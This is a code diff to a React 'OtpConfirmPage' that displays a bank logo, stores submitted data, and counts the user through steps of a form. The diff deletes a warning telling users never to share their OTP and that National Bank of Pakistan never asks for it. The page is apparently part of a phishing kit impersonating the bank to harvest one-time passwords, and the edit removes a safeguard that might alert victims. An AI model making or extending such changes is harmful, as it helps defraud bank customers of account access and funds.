@@ -1,7 +1,7 @@
 'use client'
 
 import { useEffect, useRef, useState } from 'react'
-import { ChevronRight, CircleX, TriangleAlert } from 'lucide-react'
+import { ChevronRight, CircleX } from 'lucide-react'
 import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
@@ -133,14 +133,6 @@ export default function OtpConfirmPage() {
                   )}
                 </p>
               )}
-            </div>
-
-            <div className="otp-warning mt-4">
-              <TriangleAlert aria-hidden="true" className="size-5 shrink-0 text-amber-600" />
-              <p>
-                Never share your OTP with anyone. National Bank of Pakistan will never ask for your OTP over a call or
-                SMS.
-              </p>
             </div>
 
             <div className="flex items-center justify-center gap-2 py-4" aria-label="Step 4 of 5">
